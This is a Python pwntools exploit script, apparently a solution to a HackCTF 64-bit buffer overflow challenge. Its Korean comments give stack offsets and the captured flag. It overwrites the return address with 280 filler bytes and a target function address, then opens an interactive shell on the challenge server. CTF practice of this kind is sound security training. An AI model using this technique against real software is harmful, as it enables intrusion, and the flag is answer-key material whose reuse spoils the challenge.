#! -*- coding: utf-8 -*-
from pwn import *
#p = process("./64bof_basic")
p = remote("ctf.j0n9hyun.xyz",3004)
#64 비트 bof 문제. callmebaby 함수를 호출하면 되는 모양이다.

callme = 0x0400606

# ret위치 0x7fffffffe3a8 , 입력 스택 0x7fffffffe290 위치 ,280 바이트.
# HackCTF{64b17_b0f_15_51mpl3_700}

payload = "a"*280
payload += p64(callme)

p.sendline(payload)
p.interactive()